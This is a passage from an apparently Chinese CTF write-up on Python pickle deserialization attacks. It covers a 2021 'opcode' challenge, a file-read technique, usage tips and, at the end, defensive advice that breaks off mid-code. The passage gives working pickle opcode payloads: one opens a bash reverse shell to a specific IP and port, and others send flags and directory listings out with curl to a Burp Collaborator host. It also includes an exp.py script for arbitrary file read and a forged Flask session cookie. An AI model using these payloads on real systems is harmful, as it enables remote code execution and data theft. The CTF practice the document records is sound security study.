</span></span></code></pre></div><details><summary><h4 class=inline>栗子8 - [巅峰极客 2021]opcode</h4></summary><p>首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png alt=image-20211024145247073></p><p>第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的<code>session['data']</code>处</p><p>但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法<u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写<code>pickle.loads</code>方法，只是个摆设</u>，相当于仅对R操作码进行了限制，笑嘻了</p><p>直接上<code>eval()</code>+<code>b'o'</code>来弹shell了，不多bb</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span>
</span></span><span style=display:flex><span><span style=color:#111>S</span><span style=color:#d88200>&#39;__import__(&#34;os&#34;).system(</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>bash -c &#34;bash -i &gt;&amp; /dev/tcp/101.35.113.107/8426 0&amp;1&#34;</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>)&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>o</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>或者是用<code>system()</code>+<code>curl</code>+<code>b'o'</code>外带flag</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cos</span>
</span></span><span style=display:flex><span><span style=color:#111>system</span>
</span></span><span style=display:flex><span><span style=color:#111>S</span><span style=color:#d88200>&#39;curl burp_collaborator.net/?flag=`app/readflag`&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>o</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>然后生成b64的内容（用<code>'''</code>的好处是不用考虑太多引号转义的问题</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span><span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;xxxxxxxxxxxxxx&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>))</span>
</span></span></code></pre></div><p>cookie的生成就是flask_session_cookie_manager一把梭了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 flask_session_cookie_manager3.py encode -s <span style=color:#d88200>&#39;y0u-wi11_neuer_kn0vv-!@#se%32&#39;</span> -t <span style=color:#d88200>&#39;{&#34;data&#34;: &#34;xxxxb64_contentxxxx&#34;, &#34;username&#34;: &#34;adminadmin&#34;}&#39;</span> 
</span></span></code></pre></div><p>————如果按照题目原有的意思，限制<code>builtins</code>+<code>b'R'</code>操作码也是很好做出来的</p><p>先用pker生成带R的opcode</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>getattr</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;getattr&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>dict</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;dict&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>dict_get</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;get&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;globals&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>builtins</span> <span style=color:#f92672>=</span> <span style=color:#111>globals</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>__builtins__</span> <span style=color:#f92672>=</span> <span style=color:#111>dict_get</span><span style=color:#111>(</span><span style=color:#111>builtins</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__builtins__&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>__builtins__</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;eval&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&#39;get\&#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&#39;__builtins__\&#39;\ntRp5\n0g0\n(g5\nS\&#39;eval\&#39;\ntRp6\n0g6\n(S\&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)\&#39;\ntR.&#39;</span>
</span></span></code></pre></div><p>然后手搓，在调用callable前添加MARK即<code>(</code>，去掉<code>t</code>和调用<code>t</code>用到的MARK</p><p>也就是<code>[callable] [tuple] R===>MARK [callable] [args...] o</code></p><pre tabindex=0><code>b&#39;&#39;&#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS&#39;get&#39;\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS&#39;__builtins__&#39;\nop5\n0(g0\ng5\nS&#39;eval&#39;\nop6\n0(g6\nS&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;\no.&#39;&#39;&#39;
</code></pre><p>可以看下区别</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png alt=image-20211024165337816></p><p>修改都是一对一对的，<strong>总结一下方法就是<code>0gx</code>要变为<code>0(gx</code>，<code>(gx</code>要变为<code>gx</code> ，<code>tR</code>换成<code>o</code></strong></p><p>参考：<a href=https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6>wp</a></p></details><h3 id=--使用_getattributeload_objload_inst实现任意文件读取>&ndash;&#187;使用<code>_getattribute()</code>&<code>load_obj()</code>&<code>load_inst()</code>实现任意文件读取</h3><ul><li><p><code>find_class()</code></p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>find_class</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Subclasses may override this.</span>
</span></span><span style=display:flex><span>    <span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>audit</span><span style=color:#111>(</span><span style=color:#d88200>&#39;pickle.find_class&#39;</span><span style=color:#111>,</span> <span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>proto</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>and</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>fix_imports</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>)</span> <span style=color:#f92672>in</span> <span style=color:#111>_compat_pickle</span><span style=color:#f92672>.</span><span style=color:#111>NAME_MAPPING</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>_compat_pickle</span><span style=color:#f92672>.</span><span style=color:#111>NAME_MAPPING</span><span style=color:#111>[(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>)]</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>elif</span> <span style=color:#111>module</span> <span style=color:#f92672>in</span> <span style=color:#111>_compat_pickle</span><span style=color:#f92672>.</span><span style=color:#111>IMPORT_MAPPING</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>module</span> <span style=color:#f92672>=</span> <span style=color:#111>_compat_pickle</span><span style=color:#f92672>.</span><span style=color:#111>IMPORT_MAPPING</span><span style=color:#111>[</span><span style=color:#111>module</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>__import__</span><span style=color:#111>(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>level</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>proto</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>4</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>_getattribute</span><span style=color:#111>(</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>modules</span><span style=color:#111>[</span><span style=color:#111>module</span><span style=color:#111>],</span> <span style=color:#111>name</span><span style=color:#111>)[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>modules</span><span style=color:#111>[</span><span style=color:#111>module</span><span style=color:#111>],</span> <span style=color:#111>name</span><span style=color:#111>)</span>
</span></span></code></pre></div></li></ul></li><li><p><code>_getattribute()</code></p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>_getattribute</span><span style=color:#111>(</span><span style=color:#111>obj</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>subpath</span> <span style=color:#f92672>in</span> <span style=color:#111>name</span><span style=color:#f92672>.</span><span style=color:#111>split</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.&#39;</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>subpath</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;&lt;locals&gt;&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>raise</span> <span style=color:#75af00>AttributeError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Can&#39;t get local attribute </span><span style=color:#d88200>{!r}</span><span style=color:#d88200> on </span><span style=color:#d88200>{!r}</span><span style=color:#d88200>&#34;</span>
</span></span><span style=display:flex><span>                                 <span style=color:#f92672>.</span><span style=color:#111>format</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#111>,</span> <span style=color:#111>obj</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>parent</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span>
</span></span><span style=display:flex><span>            <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>obj</span><span style=color:#111>,</span> <span style=color:#111>subpath</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>except</span> <span style=color:#75af00>AttributeError</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>raise</span> <span style=color:#75af00>AttributeError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Can&#39;t get attribute </span><span style=color:#d88200>{!r}</span><span style=color:#d88200> on </span><span style=color:#d88200>{!r}</span><span style=color:#d88200>&#34;</span>
</span></span><span style=display:flex><span>                                 <span style=color:#f92672>.</span><span style=color:#111>format</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#111>,</span> <span style=color:#111>obj</span><span style=color:#111>))</span> <span style=color:#f92672>from</span> <span style=color:#111>None</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>obj</span><span style=color:#111>,</span> <span style=color:#111>parent</span>
</span></span></code></pre></div></li></ul></li><li><p><code>read()</code></p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>read</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;utf-8&#39;</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;r&#39;</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#111>encoding</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>fin</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>fin</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
</span></span></code></pre></div></li></ul></li></ul><p>仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值</p><p>exp.py</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>struct</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>read</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;utf-8&#39;</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;r&#39;</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#111>encoding</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>fin</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>fin</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>exploit</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_prefix</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;(&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#34;X&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>bytes</span><span style=color:#111>(</span><span style=color:#111>struct</span><span style=color:#f92672>.</span><span style=color:#111>pack</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&lt;I&#34;</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>)))</span> <span style=color:#f92672>+</span> <span style=color:#111>bytes</span><span style=color:#111>(</span><span style=color:#111>filename</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;utf-8&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_suffix</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;i__main__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>read</span><span style=color:#8045ff>\n</span><span style=color:#d88200>.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload_prefix</span> <span style=color:#f92672>+</span> <span style=color:#111>payload_body</span> <span style=color:#f92672>+</span> <span style=color:#111>payload_suffix</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>assert</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;R&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>payload</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>main</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>exploit</span><span style=color:#111>(</span><span style=color:#d88200>&#34;flag&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Payload:&#34;</span><span style=color:#111>,</span> <span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Length:&#34;</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Base64:&#34;</span><span style=color:#111>,</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>main</span><span style=color:#111>()</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png alt=image-20210811193545692></p><p>再把这一部分的payload缝合到创建Animal实例的Opcode中去</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 原: name=&#39;x&#39;,category=&#39;y&#39;</span>
</span></span><span style=display:flex><span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x03</span><span style=color:#d88200>c__main__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>Animal</span><span style=color:#8045ff>\n</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>)</span><span style=color:#8045ff>\x81</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>}q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>(X</span><span style=color:#8045ff>\x04\x00\x00\x00</span><span style=color:#d88200>nameq</span><span style=color:#8045ff>\x03</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>xq</span><span style=color:#8045ff>\x04</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x08\x00\x00\x00</span><span style=color:#d88200>categoryq</span><span style=color:#8045ff>\x05</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>yq</span><span style=color:#8045ff>\x06</span><span style=color:#d88200>ub.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 缝合 应该能看出来改在哪里了</span>
</span></span><span style=display:flex><span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x03</span><span style=color:#d88200>c__main__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>Animal</span><span style=color:#8045ff>\n</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x00</span><span style=color:#d88200>)</span><span style=color:#8045ff>\x81</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x01</span><span style=color:#d88200>}q</span><span style=color:#8045ff>\x02</span><span style=color:#d88200>(X</span><span style=color:#8045ff>\x04\x00\x00\x00</span><span style=color:#d88200>nameq</span><span style=color:#8045ff>\x03</span><span style=color:#d88200>(X</span><span style=color:#8045ff>\x04\x00\x00\x00</span><span style=color:#d88200>flagi__main__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>read</span><span style=color:#8045ff>\n</span><span style=color:#d88200>q</span><span style=color:#8045ff>\x04</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x08\x00\x00\x00</span><span style=color:#d88200>categoryq</span><span style=color:#8045ff>\x05</span><span style=color:#d88200>X</span><span style=color:#8045ff>\x01\x00\x00\x00</span><span style=color:#d88200>yq</span><span style=color:#8045ff>\x06</span><span style=color:#d88200>ub.&#39;</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png alt=image-20210811195932427></p><h2 id=一些小技巧注意事项>一些小技巧&注意事项</h2><ul><li>当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A</li><li>对payload进行b64加密时，注意别把\n给单独编码了（不过正常都不会）</li><li>其他模块的load也可以触发pickle反序列化漏洞</li></ul><p>例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；<code>pandas.read_pickle()</code>直接使用<code>pickle.load()</code>方法</p><ul><li>灵活运用<u><strong>burp collaborator</strong></u></li></ul><p>虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：<a href=https://www.ruanyifeng.com/blog/2019/09/curl-reference.html>curl 的用法指南</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 基操1</span>
</span></span><span style=display:flex><span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST</span>
</span></span><span style=display:flex><span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;curl -d &#39;</span><span style=color:#f92672>@/</span><span style=color:#111>flag</span><span style=color:#f92672>.</span><span style=color:#111>txt</span><span style=color:#d88200>&#39; http://xxxx.burpcollaborator.net/)</span>
</span></span></code></pre></div><h3 id=最后出于安全角度的考量>最后，出于安全角度的考量</h3><ul><li><p>禁用pickle，使用Json或Google Protocol Buffers</p></li><li><p>当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写<code>find_class()</code>（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名</p></li><li><p>举一个hmac的栗子</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>hmac</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>Student</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>,</span> <span style=color:#111>age</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>name</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>age</span> <span style=color:#f92672>=</span> <span style=color:#111>age</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__str__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;My name is </span><span style=color:#d88200>%s</span><span style=color:#d88200>, I am </span><span style=color:#d88200>%d</span><span style=color:#d88200> years old.&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span>
</span></span><span style=display:flex><span>            <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>            <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>age</span>
</span></span><span style=display:flex><span>        <span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>HMAC_Pickler</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>secret_key</span><span style=color:#111>,</span> <span style=color:#111>seperator</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;|&#34;</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>secret_key</span> <span style=color:#f92672>=</span> <span style=color:#111>secret_key</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>seperator</span> <span style=color:#f92672>=</span> <span style=color:#111>seperator</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>digital_signature</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>signer</span> <span style=color:#f92672>=</span> <span style=color:#111>hmac</span><span style=color:#f92672>.</span><span style=color:#111>new</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>secret_key</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>signer</span><span style=color:#f92672>.</span><span style=color:#111>update</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>signer</span><span style=color:#f92672>.</span><span style=color:#111>hexdigest</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
